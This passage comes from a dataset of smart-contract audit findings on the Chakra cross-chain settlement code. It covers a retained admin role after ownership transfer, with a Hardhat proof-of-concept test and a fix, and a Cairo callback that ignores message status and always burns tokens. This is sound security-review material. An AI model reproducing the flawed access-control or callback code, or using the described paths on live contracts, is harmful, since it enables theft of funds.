`owner` during initialization:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L64)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64)\n\nThe problem arises when ownership is transferred: the `DEFAULT_ADMIN_ROLE` is not removed from the old owner, nor is it assigned to the new owner. This means the old owner retains the `DEFAULT_ADMIN_ROLE`. For example, in the `TokenRoles` contract, this issue is properly handled, as it revokes the role from the old owner and assigns it to the new one:\n```solidity\nfunction transferOwnership(address newOwner) public override onlyOwner {\n    _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n    _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n    _transferOwnership(newOwner);\n}\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol#L25\n\nBy default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, meaning only accounts with this role can grant or revoke other roles.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v5.0.2/contracts/access/AccessControlUpgradeable.sol#L40\n\nIf an owner's account is compromised, ownership must be transferred to a new address immediately. However, since the old, compromised owner still holds the `DEFAULT_ADMIN_ROLE`, they could still fully exploit the system. For example, the old owner could assign a malicious manager role that could set `required_validators` to zero, allowing any fake message to be accepted and executed on the destination chain without any validator signatures, which could lead to theft of funds.\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L139)\n- [ChakraSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L195)\n\n### PoC\nIn the test `Transfer ownership issue`, the initial owner has the address `0x90F79bf6EB2c4f870365E785982E1f101E93b906` and holds the `DEFAULT_ADMIN_ROLE`. When ownership is transferred to a new owner at address `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, the result shows that the new owner does not receive the `DEFAULT_ADMIN_ROLE`, while the old owner still retains this role.\n\n```javascript\nimport { expect } from \"chai\";\nimport {\n    loadFixture,\n} from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nimport hre, { ethers } from \"hardhat\";\nimport { Contract } from \"ethers\";\nimport { HardhatEthersSigner } from \"@nomicfoundation/hardhat-ethers/signers\";\n\ndescribe(\"ChakraSettlement\", function () {\n    const chainId = 1;\n    const chainName = \"test\"\n    const requiredValidators = 2;\n    const decimals = 8;\n    const name = \"MyToken\"\n    const symbol = \"MKT\"\n    const noBurn = false;\n\n    async function deploySettlementFixture() {\n        const [\n            tokenOwner,\n            tokenOperator,\n            manager,\n            settlementOwner,\n            settlementHnadlerOwner,\n        ] = await hre.ethers.getSigners();\n        const MyToken = await hre.ethers.getContractFactory(\"MyToken\");\n        const tokenInstance = await hre.upgrades.deployProxy(MyToken, [\n            await tokenOwner.getAddress(),\n            await tokenOperator.getAddress(),\n            name,\n            symbol,\n            decimals\n        ]);\n\n        const SettlementSignatureVerifier = await hre.ethers.getContractFactory(\"SettlementSignatureVerifier\");\n        const verifierInstance = await hre.upgrades.deployProxy(SettlementSignatureVerifier, [\n            await settlementOwner.getAddress(),\n            requiredValidators\n        ]);\n\n\n        const ChakraSettlement = await hre.ethers.getContractFactory(\"ChakraSettlement\");\n        const settlmentInstance = await hre.upgrades.deployProxy(ChakraSettlement, [\n            chainName,\n            BigInt(chainId),\n            await settlementOwner.getAddress(),\n            [await manager.getAddress()],\n            BigInt(requiredValidators),\n            await verifierInstance.getAddress(),\n        ]);\n\n        const ERC20CodecV1 = await hre.ethers.getContractFactory('ERC20CodecV1');\n        const codecInstance = await hre.upgrades.deployProxy(ERC20CodecV1, [\n            await settlementHnadlerOwner.getAddress(),\n        ])\n        const ERC20SettlementHandler = await hre.ethers.getContractFactory('ERC20SettlementHandler');\n        const settlementHandlerInstance = await hre.upgrades.deployProxy(ERC20SettlementHandler, [\n            await settlementHnadlerOwner.getAddress(), // owner\n            noBurn, // no_burn\n            chainName, //chain\n            await tokenInstance.getAddress(), // token\n            await codecInstance.getAddress(), // codec\n            await verifierInstance.getAddress(), // verifier\n            await settlmentInstance.getAddress(), // settlement\n\n        ])\n\n        const MessageLibTest = await hre.ethers.getContractFactory('MessageLibTest')\n        const messageLibTestInstance = await MessageLibTest.deploy()\n\n        // Approval operator role\n        await tokenInstance.connect(tokenOwner).add_operator(await settlementHandlerInstance.getAddress())\n\n        return { tokenInstance, codecInstance, settlmentInstance, settlementHandlerInstance, verifierInstance, messageLibTestInstance, tokenOwner, tokenOperator, manager, settlementOwner, settlementHnadlerOwner }\n    }\n\n    it(\"Transfer ownership issue\", async function () {\n        const [newOwner] = await hre.ethers.getSigners();\n        const newOwnerAddress = await newOwner.getAddress();\n        const { tokenInstance, settlmentInstance, settlementHandlerInstance, codecInstance, verifierInstance, messageLibTestInstance, manager, settlementOwner} = await loadFixture(deploySettlementFixture)\n\n        console.log(\"owner: \", await settlmentInstance.owner());\n        console.log(\"owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        await settlmentInstance.connect(settlementOwner).transferOwnership(newOwnerAddress);\n        console.log(\"new owner: \", await settlmentInstance.owner());\n        console.log(\"old owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        console.log(\"new owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlmentInstance.owner()));\n    })\n});\n```\n\nThe output log is:\n```console\n  ChakraSettlement\nowner:  0x90F79bf6EB2c4f870365E785982E1f101E93b906\nowner has DEFAULT_ADMIN role:  true\nnew owner:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\nold owner has DEFAULT_ADMIN role:  true\nnew owner has DEFAULT_ADMIN role:  false\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17\n\n\n# Vulnerability details\n\n## Impact\nWhen ownership is transferred, the `DEFAULT_ADMIN_ROLE` is not revoked from the old owner, nor is it granted to the new owner. The `DEFAULT_ADMIN_ROLE` is the admin role for all other roles, which means only accounts with this role can grant or revoke roles. This flaw could lead to serious security issues.\n\n## Proof of Concept\nThree contracts`solidity/settlement/contracts/BaseSettlement.sol`, `solidity/handler/contracts/SettlementSignatureVerifier.sol`, and `solidity/settlement/contracts/SettlementSignatureVerifier.sol`inherit the `OwnableUpgradeable` contract:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17)\n\nIn these contracts, the `DEFAULT_ADMIN_ROLE` is assigned to the `owner` during initialization:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L64)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64)\n\nThe problem arises when ownership is transferred: the `DEFAULT_ADMIN_ROLE` is not removed from the old owner, nor is it assigned to the new owner. This means the old owner retains the `DEFAULT_ADMIN_ROLE`. For example, in the `TokenRoles` contract, this issue is properly handled, as it revokes the role from the old owner and assigns it to the new one:\n```solidity\nfunction transferOwnership(address newOwner) public override onlyOwner {\n    _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n    _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n    _transferOwnership(newOwner);\n}\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol#L25\n\nBy default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, meaning only accounts with this role can grant or revoke other roles.\nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v5.0.2/contracts/access/AccessControlUpgradeable.sol#L40\n\nIf an owner's account is compromised, ownership must be transferred to a new address immediately. However, since the old, compromised owner still holds the `DEFAULT_ADMIN_ROLE`, they could still fully exploit the system. For example, the old owner could assign a malicious manager role that could set `required_validators` to zero, allowing any fake message to be accepted and executed on the destination chain without any validator signatures, which could lead to theft of funds.\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L139)\n- [ChakraSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L195)\n\n### PoC\nIn the test `Transfer ownership issue`, the initial owner has the address `0x90F79bf6EB2c4f870365E785982E1f101E93b906` and holds the `DEFAULT_ADMIN_ROLE`. When ownership is transferred to a new owner at address `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, the result shows that the new owner does not receive the `DEFAULT_ADMIN_ROLE`, while the old owner still retains this role.\n\n```javascript\nimport { expect } from \"chai\";\nimport {\n    loadFixture,\n} from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nimport hre, { ethers } from \"hardhat\";\nimport { Contract } from \"ethers\";\nimport { HardhatEthersSigner } from \"@nomicfoundation/hardhat-ethers/signers\";\n\ndescribe(\"ChakraSettlement\", function () {\n    const chainId = 1;\n    const chainName = \"test\"\n    const requiredValidators = 2;\n    const decimals = 8;\n    const name = \"MyToken\"\n    const symbol = \"MKT\"\n    const noBurn = false;\n\n    async function deploySettlementFixture() {\n        const [\n            tokenOwner,\n            tokenOperator,\n            manager,\n            settlementOwner,\n            settlementHnadlerOwner,\n        ] = await hre.ethers.getSigners();\n        const MyToken = await hre.ethers.getContractFactory(\"MyToken\");\n        const tokenInstance = await hre.upgrades.deployProxy(MyToken, [\n            await tokenOwner.getAddress(),\n            await tokenOperator.getAddress(),\n            name,\n            symbol,\n            decimals\n        ]);\n\n        const SettlementSignatureVerifier = await hre.ethers.getContractFactory(\"SettlementSignatureVerifier\");\n        const verifierInstance = await hre.upgrades.deployProxy(SettlementSignatureVerifier, [\n            await settlementOwner.getAddress(),\n            requiredValidators\n        ]);\n\n\n        const ChakraSettlement = await hre.ethers.getContractFactory(\"ChakraSettlement\");\n        const settlmentInstance = await hre.upgrades.deployProxy(ChakraSettlement, [\n            chainName,\n            BigInt(chainId),\n            await settlementOwner.getAddress(),\n            [await manager.getAddress()],\n            BigInt(requiredValidators),\n            await verifierInstance.getAddress(),\n        ]);\n\n        const ERC20CodecV1 = await hre.ethers.getContractFactory('ERC20CodecV1');\n        const codecInstance = await hre.upgrades.deployProxy(ERC20CodecV1, [\n            await settlementHnadlerOwner.getAddress(),\n        ])\n        const ERC20SettlementHandler = await hre.ethers.getContractFactory('ERC20SettlementHandler');\n        const settlementHandlerInstance = await hre.upgrades.deployProxy(ERC20SettlementHandler, [\n            await settlementHnadlerOwner.getAddress(), // owner\n            noBurn, // no_burn\n            chainName, //chain\n            await tokenInstance.getAddress(), // token\n            await codecInstance.getAddress(), // codec\n            await verifierInstance.getAddress(), // verifier\n            await settlmentInstance.getAddress(), // settlement\n\n        ])\n\n        const MessageLibTest = await hre.ethers.getContractFactory('MessageLibTest')\n        const messageLibTestInstance = await MessageLibTest.deploy()\n\n        // Approval operator role\n        await tokenInstance.connect(tokenOwner).add_operator(await settlementHandlerInstance.getAddress())\n\n        return { tokenInstance, codecInstance, settlmentInstance, settlementHandlerInstance, verifierInstance, messageLibTestInstance, tokenOwner, tokenOperator, manager, settlementOwner, settlementHnadlerOwner }\n    }\n\n    it(\"Transfer ownership issue\", async function () {\n        const [newOwner] = await hre.ethers.getSigners();\n        const newOwnerAddress = await newOwner.getAddress();\n        const { tokenInstance, settlmentInstance, settlementHandlerInstance, codecInstance, verifierInstance, messageLibTestInstance, manager, settlementOwner} = await loadFixture(deploySettlementFixture)\n\n        console.log(\"owner: \", await settlmentInstance.owner());\n        console.log(\"owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        await settlmentInstance.connect(settlementOwner).transferOwnership(newOwnerAddress);\n        console.log(\"new owner: \", await settlmentInstance.owner());\n        console.log(\"old owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        console.log(\"new owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlmentInstance.owner()));\n    })\n});\n```\n\nThe output log is:\n```console\n  ChakraSettlement\nowner:  0x90F79bf6EB2c4f870365E785982E1f101E93b906\nowner has DEFAULT_ADMIN role:  true\nnew owner:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\nold owner has DEFAULT_ADMIN role:  true\nnew owner has DEFAULT_ADMIN role:  false\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nA function similar to the one implemented in `TokenRoles` should also be added to these three contracts.\n```diff\n+   function transferOwnership(address newOwner) public override onlyOwner {\n+       _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n+       _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n+       _transferOwnership(newOwner);\n+   }\n```\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17\n\n\n# Vulnerability details\n\n## Impact\nWhen ownership is transferred, the `DEFAULT_ADMIN_ROLE` is not revoked from the old owner, nor is it granted to the new owner. The `DEFAULT_ADMIN_ROLE` is the admin role for all other roles, which means only accounts with this role can grant or revoke roles. This flaw could lead to serious security issues.\n\n## Proof of Concept\nThree contracts`solidity/settlement/contracts/BaseSettlement.sol`, `solidity/handler/contracts/SettlementSignatureVerifier.sol`, and `solidity/settlement/contracts/SettlementSignatureVerifier.sol`inherit the `OwnableUpgradeable` contract:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L12)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L11)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L17)\n\nIn these contracts, the `DEFAULT_ADMIN_ROLE` is assigned to the `owner` during initialization:\n- [BaseSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/BaseSettlement.sol#L64)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/SettlementSignatureVerifier.sol#L53)\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L64)\n\nThe problem arises when ownership is transferred: the `DEFAULT_ADMIN_ROLE` is not removed from the old owner, nor is it assigned to the new owner. This means the old owner retains the `DEFAULT_ADMIN_ROLE`. For example, in the `TokenRoles` contract, this issue is properly handled, as it revokes the role from the old owner and assigns it to the new one:\n```solidity\nfunction transferOwnership(address newOwner) public override onlyOwner {\n    _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n    _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n    _transferOwnership(newOwner);\n}\n```\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/solidity/handler/contracts/TokenRoles.sol#L25\n\nBy default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, meaning only accounts with this role can grant or revoke other roles.  \nhttps://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v5.0.2/contracts/access/AccessControlUpgradeable.sol#L40\n\nIf an owner's account is compromised, ownership must be transferred to a new address immediately. However, since the old, compromised owner still holds the `DEFAULT_ADMIN_ROLE`, they could still fully exploit the system. For example, the old owner could assign a malicious manager role that could set `required_validators` to zero, allowing any fake message to be accepted and executed on the destination chain without any validator signatures, which could lead to theft of funds.\n- [SettlementSignatureVerifier.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/SettlementSignatureVerifier.sol#L139)\n- [ChakraSettlement.sol](https://github.com/code-423n4/2024-08-chakra/blob/main/solidity/settlement/contracts/ChakraSettlement.sol#L195)\n\n### PoC\nIn the test `Transfer ownership issue`, the initial owner has the address `0x90F79bf6EB2c4f870365E785982E1f101E93b906` and holds the `DEFAULT_ADMIN_ROLE`. When ownership is transferred to a new owner at address `0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266`, the result shows that the new owner does not receive the `DEFAULT_ADMIN_ROLE`, while the old owner still retains this role.\n\n```javascript\nimport { expect } from \"chai\";\nimport {\n    loadFixture,\n} from \"@nomicfoundation/hardhat-toolbox/network-helpers\";\n\nimport hre, { ethers } from \"hardhat\";\nimport { Contract } from \"ethers\";\nimport { HardhatEthersSigner } from \"@nomicfoundation/hardhat-ethers/signers\";\n\ndescribe(\"ChakraSettlement\", function () {\n    const chainId = 1;\n    const chainName = \"test\"\n    const requiredValidators = 2;\n    const decimals = 8;\n    const name = \"MyToken\"\n    const symbol = \"MKT\"\n    const noBurn = false;\n\n    async function deploySettlementFixture() {\n        const [\n            tokenOwner,\n            tokenOperator,\n            manager,\n            settlementOwner,\n            settlementHnadlerOwner,\n        ] = await hre.ethers.getSigners();\n        const MyToken = await hre.ethers.getContractFactory(\"MyToken\");\n        const tokenInstance = await hre.upgrades.deployProxy(MyToken, [\n            await tokenOwner.getAddress(),\n            await tokenOperator.getAddress(),\n            name,\n            symbol,\n            decimals\n        ]);\n\n        const SettlementSignatureVerifier = await hre.ethers.getContractFactory(\"SettlementSignatureVerifier\");\n        const verifierInstance = await hre.upgrades.deployProxy(SettlementSignatureVerifier, [\n            await settlementOwner.getAddress(),\n            requiredValidators\n        ]);\n\n\n        const ChakraSettlement = await hre.ethers.getContractFactory(\"ChakraSettlement\");\n        const settlmentInstance = await hre.upgrades.deployProxy(ChakraSettlement, [\n            chainName,\n            BigInt(chainId),\n            await settlementOwner.getAddress(),\n            [await manager.getAddress()],\n            BigInt(requiredValidators),\n            await verifierInstance.getAddress(),\n        ]);\n\n        const ERC20CodecV1 = await hre.ethers.getContractFactory('ERC20CodecV1');\n        const codecInstance = await hre.upgrades.deployProxy(ERC20CodecV1, [\n            await settlementHnadlerOwner.getAddress(),\n        ])\n        const ERC20SettlementHandler = await hre.ethers.getContractFactory('ERC20SettlementHandler');\n        const settlementHandlerInstance = await hre.upgrades.deployProxy(ERC20SettlementHandler, [\n            await settlementHnadlerOwner.getAddress(), // owner\n            noBurn, // no_burn\n            chainName, //chain\n            await tokenInstance.getAddress(), // token\n            await codecInstance.getAddress(), // codec\n            await verifierInstance.getAddress(), // verifier\n            await settlmentInstance.getAddress(), // settlement\n\n        ])\n\n        const MessageLibTest = await hre.ethers.getContractFactory('MessageLibTest')\n        const messageLibTestInstance = await MessageLibTest.deploy()\n\n        // Approval operator role\n        await tokenInstance.connect(tokenOwner).add_operator(await settlementHandlerInstance.getAddress())\n\n        return { tokenInstance, codecInstance, settlmentInstance, settlementHandlerInstance, verifierInstance, messageLibTestInstance, tokenOwner, tokenOperator, manager, settlementOwner, settlementHnadlerOwner }\n    }\n\n    it(\"Transfer ownership issue\", async function () {\n        const [newOwner] = await hre.ethers.getSigners();\n        const newOwnerAddress = await newOwner.getAddress();\n        const { tokenInstance, settlmentInstance, settlementHandlerInstance, codecInstance, verifierInstance, messageLibTestInstance, manager, settlementOwner} = await loadFixture(deploySettlementFixture)\n\n        console.log(\"owner: \", await settlmentInstance.owner());\n        console.log(\"owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        await settlmentInstance.connect(settlementOwner).transferOwnership(newOwnerAddress);\n        console.log(\"new owner: \", await settlmentInstance.owner());\n        console.log(\"old owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlementOwner.getAddress()));\n        console.log(\"new owner has DEFAULT_ADMIN role: \", await settlmentInstance.hasRole(hre.ethers.ZeroHash, await settlmentInstance.owner()));\n    })\n});\n```\n\nThe output log is:\n```console\n  ChakraSettlement\nowner:  0x90F79bf6EB2c4f870365E785982E1f101E93b906\nowner has DEFAULT_ADMIN role:  true\nnew owner:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266\nold owner has DEFAULT_ADMIN role:  true\nnew owner has DEFAULT_ADMIN role:  false\n```\n\n## Tools Used\n\n## Recommended Mitigation Steps\nA function similar to the one implemented in `TokenRoles` should also be added to these three contracts.\n```diff\n+   function transferOwnership(address newOwner) public override onlyOwner {\n+       _revokeRole(DEFAULT_ADMIN_ROLE, msg.sender);\n+       _grantRole(DEFAULT_ADMIN_ROLE, newOwner);\n+       _transferOwnership(newOwner);\n+   }\n```\n\n\n## Assessed type\n\nContext"}, "severity": null, "difficulty": null, "type": "qa", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": null, "Difficulty": null, "Type": "qa", "Finding ID": null, "Target": null, "Severity_normalized": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-084", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 84, "page_start": null, "title": "handler's `receive_cross_chain_callback()` will always set the tx_status to `SETTLED` on source chain & burn the tokens (MintBurn Mode) even when the msg fails on destination", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L148-L161\n\n\n# Vulnerability details\n\nWhen a validator invokes `Settlement.cairo`'s `receive_cross_chain_callback()`, they will pass the `cross_chain_msg_status` as an input and base on that the msg status should be set on the source chain. Means, if the `cross_chain_msg_status` is given as `SUCCESS` then the msg status on the source chain will be set as `CrossChainTxStatus::SETTLED` and if it is not `SUCCESS` then it should simply set the status to `CrossChainTxStatus::FAILED` but in the cairo implementation, the `cross_chain_msg_status` is completely ignored:\n```cairo\n        fn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n            ///@audit-issue M cross_chain_msg_status not checked like in the solidity instance, this will always set tx_status as settled and return true and never Failed!\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n@>              tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe `tx_status` is directly set as `SETTLED`, which means it will be always get marked as `SETTLED` even when the Msg gets failed on the destination chain.\n\nAlso, as it doesn't check the `cross_chain_msg_status`, this will always burn the tokens (when the MODE is MintBurn), which is not the case when we look at the solidity instance\n```cairo\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n```\n\n## Impact\n- Wrong state update and tokens burning\n\n## Proof of Concept\nIn the solidity instance both the status is checked and tokens only get burned when the status gets marked as SETTLED:\n```solidity\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n```\n\n## Tools Used\n[Shaheen's Vision](https://x.com/0x_Shaheen/status/1722664258142650806)\n\n## Recommended Mitigation Steps\nMake sure to check the given status and mark the `tx_status` base on that.\n\n\n\n\n\n\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\n- Wrong state update and tokens burning\n", "recommendation_md": "## Recommended Mitigation Steps\nMake sure to check the given status and mark the `tx_status` base on that.\n\n\n\n\n\n\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nIn the solidity instance both the status is checked and tokens only get burned when the status gets marked as SETTLED:\n```solidity\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L148-L161\n\n**container:**\n# Vulnerability details\n\nWhen a validator invokes `Settlement.cairo`'s `receive_cross_chain_callback()`, they will pass the `cross_chain_msg_status` as an input and base on that the msg status should be set on the source chain. Means, if the `cross_chain_msg_status` is given as `SUCCESS` then the msg status on the source chain will be set as `CrossChainTxStatus::SETTLED` and if it is not `SUCCESS` then it should simply set the status to `CrossChainTxStatus::FAILED` but in the cairo implementation, the `cross_chain_msg_status` is completely ignored:\n```cairo\n        fn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n            ///@audit-issue M cross_chain_msg_status not checked like in the solidity instance, this will always set tx_status as settled and return true and never Failed!\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n@>              tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe `tx_status` is directly set as `SETTLED`, which means it will be always get marked as `SETTLED` even when the Msg gets failed on the destination chain.\n\nAlso, as it doesn't check the `cross_chain_msg_status`, this will always burn the tokens (when the MODE is MintBurn), which is not the case when we look at the solidity instance\n```cairo\n            if self.mode.read() 